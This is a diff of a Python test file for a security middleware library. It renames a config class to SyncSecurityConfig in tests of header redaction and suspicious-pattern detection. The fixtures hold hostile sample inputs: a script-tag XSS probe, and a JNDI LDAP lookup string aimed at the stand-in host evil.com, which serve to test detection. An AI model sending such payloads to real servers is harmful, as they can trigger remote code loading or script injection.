@@ -3,7 +3,7 @@ from unittest.mock import MagicMock
 
 import pytest
 
-from guard_core.models import SecurityConfig
+from guard_core.models import SyncSecurityConfig
 from guard_core.sync.core.checks.implementations.suspicious_activity import (
     SuspiciousActivityCheck,
 )
@@ -17,7 +17,7 @@ _SECRET = "SECRET-HEADER-TRAILING-SPACE"
 
 @pytest.fixture(autouse=True)
 def _force_enhanced_detection_singleton() -> None:
-    sus_patterns_handler.configure(SecurityConfig())
+    sus_patterns_handler.configure(SyncSecurityConfig())
 
 
 def _detection_lines(caplog: pytest.LogCaptureFixture) -> list[str]:
@@ -26,7 +26,7 @@ def _detection_lines(caplog: pytest.LogCaptureFixture) -> list[str]:
     ]
 
 
-def _make_middleware(config: SecurityConfig) -> MagicMock:
+def _make_middleware(config: SyncSecurityConfig) -> MagicMock:
     middleware = MagicMock()
     middleware.config = config
     middleware.logger = logging.getLogger("guard_core.test.header_space")
@@ -44,7 +44,7 @@ def _make_middleware(config: SecurityConfig) -> MagicMock:
 def test_header_name_with_trailing_space_treated_as_sensitive_in_detection_line(
     caplog: pytest.LogCaptureFixture,
 ) -> None:
-    config = SecurityConfig()
+    config = SyncSecurityConfig()
     request = SyncMockGuardRequest(
         headers={"Authorization ": f"Bearer {_SECRET} <script>alert(1)</script>"},
     )
@@ -63,7 +63,7 @@ def test_header_name_with_trailing_space_redacted_in_headers_dump(
     caplog: pytest.LogCaptureFixture,
 ) -> None:
     client_ip = "203.0.113.90"
-    config = SecurityConfig()
+    config = SyncSecurityConfig()
     middleware = _make_middleware(config)
     check = SuspiciousActivityCheck(middleware)
     pipeline = SecurityCheckPipeline([check])
@@ -94,7 +94,7 @@ def test_header_name_with_trailing_space_redacted_in_headers_dump(
 def test_excluded_header_name_with_leading_space_still_scanned_for_jndi_shield(
     caplog: pytest.LogCaptureFixture,
 ) -> None:
-    config = SecurityConfig()
+    config = SyncSecurityConfig()
     request = SyncMockGuardRequest(
         headers={" Host": "${jndi:ldap://evil.com/a}"},
     )
